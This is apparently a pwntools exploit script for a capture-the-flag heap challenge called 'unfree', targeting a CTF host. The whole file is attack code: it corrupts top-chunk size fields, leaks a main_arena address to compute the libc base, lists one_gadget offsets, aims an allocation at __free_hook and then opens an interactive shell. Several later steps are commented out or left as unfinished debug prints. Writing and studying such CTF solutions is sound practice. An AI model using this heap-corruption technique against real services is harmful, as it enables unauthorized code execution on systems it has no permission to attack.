from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./unfree_patched")
libc = ELF("./libc.so.6")
one_gadget = [0x583dc, 0x583e3, 0xef4ce, 0xef52b]
libc.sym.one_gadget = one_gadget[1]

#libc.sym.main_arena = libc.sym.__madlloc_hook + 0x10

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)



current_index = 0

def create(size):
    global current_index

    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"1")

    io.recvline()
    io.sendline(str(current_index).encode())
    io.recvline()

    io.sendline(str(size).encode())
    io.recvline()

    io.send(b"A")

    current_index += 1

    return current_index - 1

def edit(index, data):
    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"2")

    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()

    io.send(data)

def view(index):

    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"3")

    io.recvline()
    io.sendline(str(index).encode())

    return io.recvline()
        
def extract_address(leak):
    return u64(leak.strip().ljust(8, b"\x00"))

context.terminal = ['gnome-terminal', '-e']
context.arch = "amd64"
io = start()

"""
io.recvuntil("0. Exit")
io.recvline()
io.sendline(b"1")
io.recvline()
io.sendline(b"1")
io.recvline()
io.sendline(b"4096")
io.recvline()

payload = b"".join([
    b"A"*(4112 - 8),
    p64(0xffffffffffffffff)
])

io.send(payload)
"""

chunk_a = create(0x18)
edit(chunk_a, flat({0x18: p64(0xD51)}))
chunk_b = create(0xd48)

edit(chunk_a, cyclic(0x20))
main_arena_96 = extract_address(view(chunk_a)[0x20:])

main_arena_96 = int(hex(main_arena_96) + "00", 16)

print(f"[+] Leak Address = {hex(main_arena_96)}")

libc.address = (main_arena_96 - 64) - libc.sym.main_arena

print(f"system: {hex(libc.sym.system)}")
print(f"One Gadget: {hex(libc.address + one_gadget[2])}")

#"""
edit(chunk_a, flat({0x18: p64(0xd31)}))
chunk_c = create(0xd18)

edit(chunk_b, flat({0xd48: p64(0x2b1)}))
chunk_d = create(0x2a8)

chunk_e = create(0xa98)
edit(chunk_e, flat({0xa98: p64(0x2b1)}))

chunk_f = create(0x2a8)

edit(chunk_e, flat({0xa98: p64(0x291)}, p64(libc.sym.__free_hook)))
chunk_g = create(0x288)
print(f"[!] Current Index: {current_index}")
print(f"[!] Chunk G: {chunk_g}")

#print(chunk_g)
#chunk_h = create(0x288)

#edit(chunk_h, p64(libc.address + one_gadget[2]))

address_raro_xd = extract_address(view(chunk_f)[1:])
print(f"raro: {hex(address_raro_xd)}")
#"""

#edit(chunk_a, flat({0x18: p64(0x2c1)}))
#chunk_c = create(0xd30)
#edit(chunk_c, flat({0xd38: p64(0x2c1)}))
#chunk_d = create(0x2a0)
#edit(chunk_d)


io.interactive()
